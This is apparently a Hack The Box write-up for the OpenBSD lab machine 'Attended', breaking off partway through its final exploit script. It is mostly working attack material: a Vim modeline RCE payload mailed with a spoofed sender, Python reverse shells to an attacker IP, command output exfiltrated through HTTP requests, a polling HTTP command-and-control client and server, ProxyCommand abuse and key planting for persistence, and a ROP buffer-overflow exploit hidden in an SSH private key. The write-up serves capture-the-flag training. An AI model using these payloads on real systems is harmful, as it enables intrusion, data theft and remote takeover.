@@ -1,0 +1,855 @@
+Attended
+
+5th May 2021 / Document No D21.100.117
+Prepared By: polarbearer
+Machine Author(s): guly & freshness
+Difficulty: Insane
+Classification: Official
+Synopsis
+
+Attended is an insane difficulty OpenBSD machine that presents a variety of different concepts like phishing,
+exploiting CVEs, bypassing outbound traffic restrictions, detecting misconfigurations and binary exploitation
+(with an interesting twist in the way the payload had to be delivered). Foothold is gained by exploiting a Vim
+modeline vulnerability in a text attachment sent as an email message. This results in remote command
+execution but since only HTTP outbound traffic is allowed a workaround is featured by using a simple HTTP
+client/server application. System enumeration leads to a shared directory where ssh configuration files can
+be written to be executed by another user ( freshness ), allowing to run arbitrary commands via the
+ProxyCommand configuration directive. An executable binary vulnerable to a stack-based buffer overflow is
+then exploited to gain code execution as root (on a different host) by delivering a malicious payload through
+an SSH private key (the vulnerable program is configured as the AuthorizedKeysCommand in the sshd
+configuration).
+
+Skills Required
+
+      Basic OpenBSD knowledge
+      Enumeration
+      Scripting
+      Binary Exploitation and Return-oriented Programming
+
+Skills Learned
+
+      Creating an HTTP-based pseudo-reverse shell
+      Finding uncommon gadgets for ROP exploitation
+      Knowledge of the OpenSSH private key format
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.221 | grep '^[0-9]' | cut -d '/' -f 1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.221
+
+Nmap shows two open ports, corresponding to the OpenSSH (port 22) and OpenSMTPD (port 25) services.
+The SMTP banner, which is displayed as part of the nmap scripts output, reveals a domain name
+( attended.htb ) and a potential username ( guly ).
+
+OpenSMTPD
+We need to verify that user account guly does indeed exist by his email address guly@attended.htb .
+Since the VRFY command is disabled on the OpenSMPTD server, we can verify the account by checking the
+result of the RCPT command, which allows us to distinguish between an existent and nonexistent users. We
+can run this test manually (by sending the HELO , MAIL FROM and RCPT TO commands) or with an
+automated tool such as smtp-user-enum . The only thing to keep in mind is that, due to the fact that
+OpenSMTPD tries to strictly adhere to RFC 5321, opening ( < ) and closing ( > ) brackets around user names
+are required.
+
+   smtp-user-enum -f '<test@test.htb>' -u '<guly@attended.htb>' -M RCPT -t 10.10.10.221
+   smtp-user-enum -f '<test@test.htb>' -u '<nonexistent@attended.htb>' -M RCPT -t
+   10.10.10.221
+Having confirmed that user indeed exists, we can now try sending him a message to see if we get any kind
+of reply. We run a Python smtpd DebuggingServer on a separate window or pane:
+
+   python -m smtpd -n -c DebuggingServer 10.10.14.30:25
+
+We use the mail command to send an email to guly@attended.htb through the listening OpenSMTPD
+server:
+
+   echo test | mail -s test -S from=test@test.htb -S mta=smtp://10.10.10.221
+   guly@attended.htb
+
+After a short while, a reply message is sent to our DebuggingServer :
+This message reveals a few bits of potentially useful information about the user guly :
+      he is only going to read messages coming from user freshness ;
+      he refers to himself as a "Vim power user";
+      he does not like HTML e-mail and proprietary attachments.
+
+According to the first point above, the next logical step is to send another test message by setting the From
+header to freshness@attended.htb :
+
+   echo test | mail -s test -S from=freshness@attended.htb -S mta=smtp://10.10.10.221
+   guly@attended.htb
+
+The following reply is received:
+By reading this message, it seems that user guly is expecting some kind of attachment from user
+freshness . Additionally, we now know that a Python 2 environment can be available on the system, and
+that unspecified outbound traffic restrictions may be in place.
+We also know that user guly is "against proprietary attachments". Let's see what happens if we attach a
+PDF file:
+
+   echo test | mail -s test -S from=freshness@attended.htb -a test.pdf -S
+   mta=smtp://10.10.10.221 guly@attended.htb
+
+As expected, the attachment is just discarded. Let's try with a plain text file instead:
+   echo a > txt; echo test | mail -s test -S from=freshness@attended.htb -a txt -S
+   mta=smtp://10.10.10.221 guly@attended.htb
+According to this message, user guly is going to open our text attachment with vim (which matches his
+"Vim power user" self-description). Another potentially relevant piece of information is the existence of a
+/home/shared directory that may contain unspecified configuration files.
+Foothold
+
+Looking for potential Vim vulnerabilities, we come across CVE-2019-12735, which could allow us to inject
+arbitrary system commands within modelines on vulnerable vim versions (< 8.1.1365). To test for RCE we
+send the following text file, containing a simple ping payload:
+
+   echo ':!ping -c3 10.10.14.30||" vi:fen:fdm=expr:fde=assert_fails("source\!\
+   \%"):fdl=0:fdt="' > pingcmd
+   echo test | mail -s test -S from=freshness@attended.htb -S mta=smtp://10.10.10.221 -a
+   pingcmd guly@attended.htb
+We run tcpdump to intercept ICMP traffic:
+   tcpdump -nn -i tun0 icmp
+After a while, a sequence of three ICMP echo requests (ping) is received, which confirms that our payload
+was successful.
+
+Unfortunately, common reverse shell payloads seem to be detected and blocked. For example, this is what
+happens if we try sending a file containing a Python reverse shell:
+
+   :!python -c 'import
+   socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.
+   10.14.30",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+   os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'||"
+   vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+Additionally, as noted earlier, we expect the machine to have some outbound traffic restrictions. After some
+trial and error, we find out that only HTTP outbound traffic is allowed. We can use the native OpenBSD ftp
+tool to trigger a connection from the target machine to an HTTP server under our control (i.e. a Python 3
+http.server ).
+
+   python -m http.server 80
+
+   echo ':!ftp http://10.10.14.30/test|| " vi:fen:fdm=expr:fde=assert_fails("source\!\
+   \%"):fdl=0:fdt="' > cmd
+   echo test | mail -s test -S from=freshness@attended.htb -S mta=smtp://10.10.10.221 -a
+   cmd guly@attended.htb
+
+Knowing this, we are able execute arbitrary commands, encode their output to base64 (using the standard
+OpenBSD tool b64encode ) and exfiltrate it as the URL path of an HTTP request to our web server. For
+example, we can get the output of the id command by sending the following messsage:
+
+   echo ':!ftp http://10.10.14.30/`id|b64encode -|egrep -v "^begin|^====$"|tr -d "\n"`|| "
+   vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > cmd
+   echo test | mail -s test -S from=freshness@attended.htb -S mta=smtp://10.10.10.221 -a
+   cmd guly@attended.htb
+This confirms we achieved RCE in the context of the guly user. We could enumerate the system this way by
+sending one command at a time and waiting for its execution, but it would be a very inefficient and time
+consuming approach because of the long delays.
+As observed earlier though, Python 2 could be already installed on the system (note that this is not by
+default on OpenBSD systems). To verify this, we send the following payload and decode the resulting
+output, which confirms our hypothesis:
+
+   echo ':!ftp http://10.10.14.30/`which python2|b64encode -|egrep -v "^begin|^====$"|tr -
+   d "\n"`|| " vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > cmd ; echo
+   test | mail -s test -S from=freshness@attended.htb -S mta=smtp://10.10.10.221 -a cmd
+   guly@attended.htb
+
+Since Python 2 is available on the target system, we can write a simple client/server Python application
+where the client (that we will plant and execute on the target) polls for commands by periodically sending
+HTTP request to the server (running on our attacking machine), which then reads commands from standard
+input and sends them in reply to the client via a custom HTTP header. The client then executes the
+commands, captures their standard output and error and sends the results back to the server, base64-
+encoded, through another custom header. This will allow us to obtain a "pseudo-shell" where we can
+execute commands in a seemingly interactive way.
+The following is the server code ( attended_server.py ) that we can run locally:
+
+   #!/usr/bin/python3
+   import sys
+   import threading
+   import base64
+   from http.server import BaseHTTPRequestHandler, HTTPServer
+
+   cmd = None
+   running_cmd = False
+   last_cmd = False
+
+   class RequestHandler(BaseHTTPRequestHandler):
+          def do_GET(self):
+                 global cmd
+                 global running_cmd
+                 global last_cmd
+                 if self.headers.get('exit'):
+                         last_cmd = True
+                 out = self.headers.get('output')
+                 if out:
+                         print(base64.b64decode(out).decode(), flush=True)
+                         running_cmd = False
+                 self.send_response(200)
+                 if cmd:
+                         self.send_header('cmd', cmd)
+                         cmd = None
+                 self.end_headers()
+                 return
+          def log_message(self, format, *args):
+                 return
+
+   def run_server(port):
+          server = ('', port)
+          httpd = HTTPServer(server, RequestHandler)
+          httpd.serve_forever()
+
+   if __name__ == '__main__':
+          port = int(sys.argv[1]) if len(sys.argv) > 1 else 80
+          t = threading.Thread(target=run_server, args=(port,), daemon=True).start()
+          while not last_cmd:
+                 if not running_cmd:
+                         cmd = input("$ ")
+                         running_cmd = True
+
+This is the client script ( attended_client.py ) that we are going to upload and execute on the target:
+
+   import os
+   import sys
+   import base64
+   import requests
+   from time import sleep
+   if len(sys.argv) < 2:
+          sys.exit(1)
+
+   port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+   url = "http://" + sys.argv[1] + ":" + str(port)
+   cmd = ""
+   while cmd != 'exit':
+
+          r = requests.get(url)
+          cmd = r.headers.get('cmd')
+          if cmd:
+
+                 out = os.popen(cmd + " 2>&1").read()
+                 r = requests.get(url, headers={'output': base64.b64encode(out)})
+          sleep(1)
+   requests.get(url, headers={'exit': 'bye'})
+
+In addition to port 80, outbound HTTP connections are also allowed on port 8080 (this can be easily
+verified). We can therefore run attended_server on port 80 and serve the attended_client file on port
+8080. We run the following commands in three different windows / tabs / panes:
+
+   ./attended_server.py
+
+   python3 -m http.server 8080
+
+   echo ':!ftp http://10.10.14.30:8080/attended_client.py; python2 attended_client.py
+   10.10.14.30|| " vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > cmd ;
+   echo test | mail -s test -S from=freshness@attended.htb -S mta=smtp://10.10.10.221 -a
+   cmd guly@attended.htb
+We wait until the file is downloaded:
+
+Back to our attended_server.py script, we can now run commands pseudo-interactively:
+Lateral Movement
+
+As noted earlier, the /home/shared directory is a potential target:
+   [...] you will find your config file within a few minutes in the /home/shared folder.
+
+With our current access (as the user guly ) we can't see what's inside the directory, but we have write
+permissions on it:
+
+Simple enumeration of the user's home directory reveals the existence of a Vim swap file in
+/home/guly/tmp . We know this user uses Vim as the main text editor, so it may be worth worth taking a
+look.
+
+By running strings on the swap file we can see the original file name and contents, which appears to be
+an OpenSSH configuration file for the user freshness :
+From the information we have gathered so far, we can make an educated guess about how the two users
+( guly and freshness ) may be interacting with each other (remember they are working together on an
+issue, as we know from the first email reply we received from guly ):
+
+       freshness sends an SSH configuration file to guly as a text attachment;
+       guly opens the file with Vim to check its syntax, and if it looks correct copies it to /home/shared ;
+       freshness tests the configuration files by running ssh on them.
+While we can be quite confident about the first two points, the third is just an assumption on our part.
+Nevertheless, it is something worth checking as it might grant us arbitrary command execution in the
+context of the freshness user via the ProxyCommand configuration option.
+We run a second instance of attended_server.py on port 8080:
+
+   ./attended_server.py 8080
+From our pseudo-shell as guly we run the following commands:
+
+   cp attended_client.py /tmp ; echo -e 'Host *\n ProxyCommand /usr/local/bin/python2
+   /tmp/attended_client.py 10.10.14.30 8080' > /home/shared/tryme
+We send the id command to our attended_server.py running on port 8080. After few seconds we
+receive a connection from freshness and our command is executed:
+
+We can find the user flag in /home/freshness/user.txt .
+The .ssh subdirectory is writable (which wasn't the case for guly 's .ssh directory), so we can copy our
+public key to the authorized_keys file to maintain access:
+
+In case our key is wiped from the authorized_keys file, the following one-liner will allow us to quickly
+regain access as user freshness by exploiting the Vim modeline vulnerability to write a configuration file
+that triggers the copy of our public key to /home/freshness/.ssh/authorized_keys :
+
+   echo ':!'"echo -n $(echo -e "Host *\n ProxyCommand echo \"`cat ~/.ssh/id_rsa.pub`\" >>
+   /home/freshness/.ssh/authorized_keys"|base64 -w0)|b64decode -r >
+   /home/shared/authorizeme||\""' vi:fen:fdm=expr:fde=assert_fails("source\!\
+   \%"):fdl=0:fdt="' > authorizeme ; echo test | mail -s test -S
+   from=freshness@attended.htb -S mta=smtp://10.10.10.221 -a authorizeme guly@attended.htb
+After a few minutes we will be able to SSH to the system as freshness :
+   ssh freshness@10.10.10.221
+Privilege Escalation
+
+The /home/freshness/authkeys directory contains a binary file and a text note:
+
+The note.txt file contains what seems to be a TODO-list:
+
+The list mentions two hosts: attended (the one we are currently on) and attendedgw . We can grep them
+from the /etc/hosts file:
+
+According to the note, the authkeys command has been enabled on attendedgw to be used with sshd .
+While the command has not yet been enabled on attended , the sshd configuration file
+( /etc/ssh/sshd_config ) has been set up so that enabling it only requires uncommenting two lines:
+The AuthorizedKeysCommand and AuthorizedKeysCommandUser options allow sshd to obtain public keys
+by running an external program when no matching keys are found in the authorized_keys file. The
+program can accept different arguments and should produce a (possibly empty) sequence of authorized
+keys on standard output, one per line.
+The AuthorizedKeysCommandUser specifies the user under whose account the program is run. While the
+sshd_config manual recommends setting a dedicated (unprivileged) user for this task, the commented
+configuration on attended reveals that the program will be run as root instead. The "use nobody" step on
+the TODO list, which we assume to be for setting the AuthorizedKeysCommandUser option to nobody , is
+unchecked for both hosts, which implies that the authkeys program may be executed with root privileges
+when someone attempts an SSH login to attendedgw .
+We copy the authkeys binary to a temporary directory and chmod +x it in order to make it executable.
+
+   mkdir /tmp/.test
+   cp /home/freshness/authkeys/authkeys /tmp/.test
+   chmod +x /tmp/.test/authkeys
+According to the AuthorizedKeysCommand setting, the program takes the following parameters (in order):
+
+      key fingerprint ( %f );
+      user's home directory ( %h );
+      key type ( %t );
+      base64-encoded key ( %k ).
+Indeed, attempting to execute the program with either less or more than four arguments yields a "wrong
+number of arguments" error:
+
+Running the program with the correct number of arguments shows that it is not complete.
+
+We use the jot tool to fuzz the last parameter and discover a potential buffer overflow:
+   for i in `jot 100`; do k=`python2 -c "print 'A'*(16*$i)"`; ./authkeys a b c $k
+   >/dev/null 2>&1; if [ $? -ne -0 ]; then echo $i; break; fi; done
+   65
+   ./authkeys a b c `python2 -c "print 'A'*(16*65)"`
+   Evaluating key...
+   Segmentation fault (core dumped)
+
+If we open the program with the tool Ghidra , we see the buffer size is 768 bytes:
+   undefined local_308 [768];
+
+The gdb debugger is installed on the target system, which allows us to do some quick debugging (we need
+to encode the key parameter as the program expects base64 data).
+
+   gdb ./authkeys
+   (gdb) r a b c `python2 -c 'print "A"*776+"BBBB\x00\x00\x00\x00"'|b64encode -|egrep -v
+   '^begin|^===='|tr -d '\n'`
+
+We are able to overflow the buffer and set the saved register instuction pointer (RIP) to BBBB with an offset
+of 776 bytes. We set a breakpoint inside the function and run the program again with slightly modified
+arguments:
+   (gdb) break *0x40036b
+   Breakpoint 1 at 0x40036b
+   (gdb) r a b c `python2 -c 'print "A"*768+"BBBBBBBB"+"CCCC\x00\x00\x00\x00"'|b64encode -
+   |egrep -v '^begin|^===='|tr -d '\n'`
+
+When the breakpoint is indeed reached, we can view the registers:
+   (gdb) info registers
+We can see that RDX was set to BBBBBBBB , which corresponds to a 768 byte offset. If we use the c
+command to continue execution, the RIP is set to CCCC as expected:
+
+   (gdb) c
+
+Having identified the vulnerability, we can now search for a way to exploit it.
+By running objdump -s authkeys , we notice a syscall instruction at 4003cf :
+
+4003cf:  0f 05          syscall
+
+We search the binary for gadgets that will allow us to build a ROP chain that culminates in the execution of
+the execve system call, which would grant us arbitrary command execution.
+
+It can be verified by reading the /usr/include/sys/syscall.h header file that the OpenBSD execve
+system call number and arguments are the same as the Linux ones (which means we can refer to one of the
+many Linux system call tables available online):
+
+/* syscall: "execve" ret: "int" args: "const char *" "char *const *" "char *const *" */
+
+#define SYS_execve  59
+
+To accomplish our goal we need to set four (4) registers:
+
+      RAX: 0x3B (59);
+      RDI: pointer to cmd string;
+      RSI: pointer to argv array;
+      RDX: pointer to envp array (we can set this to NULL).
+
+A gadget for setting RDX can be easily found by looking once again at the objdump -S output:
+
+objdump -S authkeys | grep -A1 "pop.*%rdx"
+No obvious gadgets for RAX can be found by just looking at the disassembled code. We use the ROPgadget
+tool to look deeper:
+
+   ROPgadget --binary authkeys
+This allows us to find two gadgets that we can use to alter the least significant byte of the RAX registry ( AL )
+by inverting all the bits ( NOT ) or shifting them to the right ( SHR ):
+
+Notice that these correspond to the f6d0 and d1e8 opcodes from the objdump output below.
+
+We also notice that RAX is set to zero ( xor rax,rax ) before our ROP chain is called, which means AL will be
+00000000 :
+
+By chaining calls to NOT and SHR we can obtain the desired value 0x3B ( 00111011 ):
+      NOT ( 00000000 -> 11111111 );
+      SHR ( 11111111 -> 01111111 );
+      SHR ( 01111111 -> 00111111 );
+      NOT ( 00111111 -> 11000000 );
+      SHR ( 11000000 -> 01100000 );
+      NOT ( 01100000 -> 10011111 );
+      SHR ( 10011111 -> 01001111 );
+      SHR ( 01001111 -> 00100111 );
+      SHR ( 00100111 -> 00010011 );
+      NOT ( 00010011 -> 11101100 );
+      SHR ( 11101100 -> 01110110 );
+      SHR ( 01110110 -> 00111011 ).
+In order to set the cmd and argv parameters, we can write the necessary strings and pointers to the
+buffer, which has enough space for our needs. We will structure our data in the following way:
+  1. A null-terminated string containing the command path;
+  2. Null-terminated strings representing the command arguments;
+  3. A pointer to the string in 1;
+  4. Null-terminated pointers to the strings in 2;
+  5. A pointer to the array of pointers in 4.
+Additionally, we can see from tool Ghidra that the base64-decoded string is written to a static memory
+location, at the fixed address of 0x006010c0 :
+
+   puVar12 = &DAT_006010c0;
+
+This address is in the .data section of the binary:
+
+   readelf -x .data authkeys
+
+We can verify the address with gdb by passing a known string (i.e. THISISATEST base64 encoded) and
+checking if it is indeed written to 0x6010c0 :
+
+(gdb) break *0x40036b
+(gdb) r a b c VEhJU0lTQVRFU1QK
+
+(gdb) x/s 0x6010c0
+
+0x6010c0:  "THISISATEST\n"
+This means that the buffer address can be known beforehand. In order to make our ROP chain work, we
+need a way to put the addresses of the cmd and argv pointers in the RDI and RSI registers respectively.
+We keep digging in the ROPgadget output and find the following gadgets:
+
+which correspond to the opcodes f30f1002 and f30f2df0 respectively in the following instructions:
+
+The movss instruction moves a single-precision floating-point value pointed by RDX into the xmm0 register;
+the cvtss2si instruction takes a floating-point value from xmm0 , converts it to an integer and puts the result
+to the ESI register. We can combine the two gadget as follows to get an arbitrary value into RSI:
+
+  1. Encode the value to a floating-point value and write it to memory;
+  2. Set RDX to point to the above memory address (we know RDX is pointing to buffer + 768 , so we can
+
+      just write our address to that location);
+  3. Call the movss gadget;
+  4. Call the cvtss2si gadget.
+The same process, combined with the following gadget, can also be used to write values to the RDI register:
+To verify command execution, we will just check that we can write files to /tmp . We run the following
+Python script to generate a base64-encoded payload for this task:
+
+   #!/usr/bin/python3
+
+   from struct import pack
+   import base64
+
+   def p64(x):
+          return pack('<Q', x)
+
+   def pad(x):
+          return x + b'\x00'*(8 - len(x)%8)
+
+   def to_float(x):
+          f = pack('<f', x)
+          f += b'\x00' * (8-len(f))
+          return f
+
+   # The buffer starts here
+   baseaddr = 0x6010c0
+
+   # ROP Gadgets
+   rop = {
+
+          'syscall': 0x00000000004003cf,
+          'poprdx': 0x000000000040036a,
+          'shr': 0x0000000000400370,
+          'not': 0x000000000040036d,
+          'movss': 0x000000000040037b,
+          'cvtss2si': 0x0000000000400380,
+          'movrdirsi_poprdx': 0x0000000000400367
+   }
+
+   # Command and arguments (with necessary padding)
+   cmd = [
+
+          pad(b'/usr/bin/touch'),
+          pad(b'/tmp/pwned'),
+          pad(b'/tmp/pwned2')
+   ]
+
+   buf = b''
+
+   # Cmd and arg strings
+   cmd_offset = len(buf)
+   for c in cmd:
+
+          buf += c
+   buf += p64(0)
+
+   # Cmd and arg pointers
+ptr_offset = len(buf) - cmd_offset
+for c in cmd:
+
+       buf += p64(baseaddr + buf.find(c))
+buf += p64(0)
+
+# Floating point pointers
+fp_offset = len(buf)
+buf += to_float(baseaddr)
+buf += to_float(baseaddr + ptr_offset)
+
+# Fill with zeros until the RDX offset
+buf += ((0x0300 - len(buf))//8) * p64(0x00)
+
+# RDX points here
+buf += p64(baseaddr + fp_offset)
+
+# RAX: 0x3B
+buf += p64(rop['not'])
+buf += p64(rop['shr'])
+buf += p64(rop['shr'])
+buf += p64(rop['not'])
+buf += p64(rop['shr'])
+buf += p64(rop['not'])
+buf += p64(rop['shr'])
+buf += p64(rop['shr'])
+buf += p64(rop['shr'])
+buf += p64(rop['not'])
+buf += p64(rop['shr'])
+buf += p64(rop['shr'])
+
+# RDI: cmd pointer
+buf += p64(rop['movss'])
+buf += p64(rop['cvtss2si'])
+buf += p64(rop['movrdirsi_poprdx'])
+
+# RSI: arg pointer
+buf += p64(baseaddr + fp_offset + 0x08)
+buf += p64(rop['movss'])
+buf += p64(rop['cvtss2si'])
+
+# RDX: NULL
+buf += p64(rop['poprdx'])
+buf += p64(0x0)
+
+# System call
+buf += p64(rop['syscall'])
+
+# Print with leading chars for alignment
+print(base64.b64encode(buf).decode())
+We pass the base64 output as the fourth argument to the authkeys program:
+
+   ./authkeys a b c
+   L3Vzci9iaW4vdG91Y2gAAC90bXAvcHduZWQAAAAAAAAvdG1wL3B3bmVkMgAAAAAAAAAAAAAAAADAEGAAAAAAANA
+   QYAAAAAAA4BBgAAAAAAAAAAAAAAAAAIAhwEoAAAAA8CHASgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGBFgAAAAAABtA0AAAAAA
+   AHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAAB
+   tA0AAAAAAAHADQAAAAAAAcANAAAAAAAB7A0AAAAAAAIADQAAAAAAAZwNAAAAAAAAgEWAAAAAAAHsDQAAAAAAAgA
+   NAAAAAAABqA0AAAAAAAAAAAAAAAAAAzwNAAAAAAAA=
+
+The files are written:
+
+This confirms our ROP chain is working. In order to have our payload executed on attendedgw , we need to
+embed it into an RSA key so that OpenSSH will pass it to authkeys when attempting to authenticate us.
+A key with a default length of 2048 bits won't be enough to overflow the buffer, so we generate a 16 kb key:
+ssh-keygen -f basekey -b 16384
+
+By looking at the OpenSSH private key format, our understanding is that we will have to overwrite the
+privatekey1 field.
+
+;; Encrypted section
+
+;; This one is a again a buffer with size
+
+;; specified by the uint32 value, which preceeds it.
+
+;; The fields below are for RSA private keys.
+
+uint32 (size of buffer)
+
+uint32 check-int
+
+uint32 check-int (must match with previous check-int value)
+
+string keytype ("ssh-rsa")
+
+mpint n                  (RSA modulus)
+
+mpint e                  (RSA public exponent)
+
+mpint d                  (RSA private exponent)
+
+mpint iqmp               (RSA Inverse of Q Mod P, a.k.a iqmp)
+
+mpint p                  (RSA prime 1)
+
+mpint q                  (RSA prime 2)
+
+string comment (Comment associated with the key)
+
+byte[n] padding (Padding according to the rules above)
+
+According to the key format, following the ssh-rsa string are the n , e and d fields. We write a short
+Python script to print the value of n :
+
+#!/usr/bin/python
+
+from Crypto.PublicKey import RSA
+
+with open('basekey', 'r') as f:
+       key_encoded = f.read()
+       key = RSA.importKey(key_encoded)
+       print(hex(key.n))
+To better understand which part of the private key is passed to the AuthorizedKeysCommand by the
+OpenSSH server, we configure it to call a nonexistent AuthorizedKeysCommand and then run sshd in
+debug mode. An error containing the command string will be triggered and displayed in the debug output.
+We set AuthorizedKeysCommand and AuthorizedKeysCommandUser in /etc/ssh/sshd_config :
+
+   AuthorizedKeysCommand /usr/local/bin/getkey %f %h %t %k
+   AuthorizedKeysCommandUser nobody
+We run the sshd program we just compiled in debug mode:
+   sudo `which sshd` -ddd
+From another pane we attempt to authenticate to the OpenSSH server using the basekey private key
+generated above:
+   ssh -i basekey localhost
+The following error regarding the AuthorizedKeysCommand subprocess is displayed in the sshd debug
+output:
+
+The private key is not shown in its entirety, but even with partially decoded data we will be able to identify
+the part of the key that is passed to the authkeys program by sshd . We look at the first few bytes in hex
+form after decoding them from base64:
+
+   echo -n
+   AAAAB3NzaC1yc2EAAAADAQABAAAIAQDPL27o4bwdLKQnL6tCpZ0EmNgU09i4svpoEgBzR/AOfMJt4MvZHyESmCq
+   KsDkrvLjPnKWS2Dwk+llcIdW4wX5I | base64 -d | xxd
+
+The value of n ( 0cf2f6ee8... ) starts at byte 23. We will have to take this offset into account when building
+the ROP chain, because pointer addresses need to be increased by the same amount to point to our strings.
+We now need to find out where n is located in the private key file ( basekey ) that we are going to overwrite.
+We decode the file by using base64 and xxd as before:
+
+   grep -v '^-' basekey | tr -d '\n' | base64 -d | xxd
+
+As we can see, n ( 0xcf2f6ee8 ) starts at 0x85e . Before that, the following bytes can be seen:
+
+00 00 00 07           // size of the "ssh-rsa" string
+73 73 68 2D 72 73 61  // "ssh-rsa"
+00 00 08 01           // key size
+00                    // sign prefix
+
+The last null byte (which we labeled "sign prefix") was added because of the way ASN.1 encodes integers. If
+the most significant bit of n was 1 , the resulting encoded integer would be negative; adding a null byte
+ensures the most significant bit is zero (which means n is positive) without changing the key value.
+
+As it turns out, starting to overwrite the key from 0x85e would not work, which might be explained by of
+how the mpint data type is defined in RFC 4251:
+
+mpint
+         Represents multiple precision integers in two's complement format,
+         stored as a string, 8 bits per byte, MSB first. Negative numbers
+         have the value 1 as the most significant bit of the first byte of
+         the data partition. If the most significant bit would be set for
+         a positive number, the number MUST be preceded by a zero byte.
+         Unnecessary leading bytes with the value 0 or 255 MUST NOT be
+         included. The value zero MUST be stored as a string with zero
+         bytes of data.
+
+Having a zero in the most significant bit of the first byte of our payload, the preceding null byte (the one we
+called "sign prefix") would be interpreted as an "unnecessary leading byte", which could make our key
+invalid. Therefore, we are going to skip one more byte and begin overwriting at 0x85f ; this means we also
+have to increase the buffer offset to 24 (which is perfect because it results in correct byte alignment, so we
+won't have to worry about this).
+
+The following ( exploit.py ) is the final exploit, which reads the private key from our basekey file,
+generates the ROP chain and overwrites the required bytes; the resulting key is printed to standard output.
+
+#!/usr/bin/python3
+from struct import pack
+import base64
+import argparse
+
+def p64(x):
+       return pack('<Q', x)
+
+def pad(x):
+       return x + b'\x00'*(8 - len(x)%8)
+
+def to_float(x):
+       f = pack('<f', x)
+       f += b'\x00' * (8-len(f))
+       return f
+
+# Read private key from file
+def priv_key(filename):
+
+       with open(filename, "rb") as f:
+              pkey = f.read()
+
+       return pkey
+
+# Add rop payload to private key
+def add_rop(key, rop):
+
+       key = key.replace(b"-----BEGIN OPENSSH PRIVATE KEY-----", b"")
+       key = key.replace(b"-----END OPENSSH PRIVATE KEY-----", b"")
+       key = key.replace(b"\r", b"").replace(b"\n", b"")
+       key = bytearray(base64.b64decode(key))
+       key[0x85f: 0x85f+len(rop)] = rop
+       key = base64.b64encode(key)
+       key = b'\\n'.join(key[i:i+70] for i in range(0, len(key), 70))
+       key = b"-----BEGIN OPENSSH PRIVATE KEY-----\\n" + key
+       key += b"\\n-----END OPENSSH PRIVATE KEY-----\\n"
+       return key.decode()
+
+# Generate ROP chain to spawn reverse shell via execve syscall
+def gen_rop(lhost, lport):
+
+       # The buffer starts here
+       buffstart = 0x6010c0
+
+       # Private key offset
+       pkey_offset = 24
+
+       # Base address
+       baseaddr = buffstart + pkey_offset
+       # ROP Gadgets
+       rop = {
+
+              'syscall': 0x00000000004003cf,
+              'poprdx': 0x000000000040036a,
+              'shr': 0x0000000000400370,
+              'not': 0x000000000040036d,
+              'movss': 0x000000000040037b,
+              'cvtss2si': 0x0000000000400380,
+              'movrdirsi_poprdx': 0x0000000000400367
+       }
+
+       cmd = [ pad(b'/usr/local/bin/python2'),
+                     pad(b'-c'),
+                     pad(f'import
+
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("
+{lhost}",
+{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subproces
+s.call(["/bin/ksh","-i"]);'.encode())
+
+       ]
+
+       buf = b''
+
+       # Cmd and arg strings
+       cmd_offset = len(buf)
+       for c in cmd:
+
+              buf += c
+       buf += p64(0)
+
+       # Cmd and arg pointers
+       ptr_offset = len(buf) - cmd_offset
+       for c in cmd:
+
+              buf += p64(baseaddr + buf.find(c))
+       buf += p64(0)
+
+       # Floating point pointers
+       fp_offset = len(buf)
+       buf += to_float(baseaddr)
+       buf += to_float(baseaddr + ptr_offset)
+
+       # Fill with zeros until the RDX offset
+       buf += ((0x0300 - len(buf) - pkey_offset)//8) * p64(0x00)
+
+       # RDX points here
+       buf += p64(baseaddr + fp_offset)
+
+       # RAX: 0x3B
+       buf += p64(rop['not'])
+       buf += p64(rop['shr'])
+       buf += p64(rop['shr'])
+          buf += p64(rop['not'])
